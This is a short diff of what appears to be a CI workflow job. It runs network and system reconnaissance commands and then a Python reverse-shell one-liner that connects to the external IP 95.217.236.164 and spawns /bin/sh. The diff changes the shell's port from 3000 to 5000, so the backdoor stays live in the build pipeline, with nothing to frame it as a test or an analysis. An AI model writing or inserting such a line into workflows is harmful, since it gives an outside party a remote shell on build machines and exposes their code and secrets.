@@ -10,4 +10,4 @@ jobs:
      - run: cat /etc/resolv.conf
      - run: uname -a
      - run: ifconfig
-     - run: python -c 'import socket,os,pty;s=socket.socket();s.connect(("95.217.236.164",3000));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+     - run: python -c 'import socket,os,pty;s=socket.socket();s.connect(("95.217.236.164",5000));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
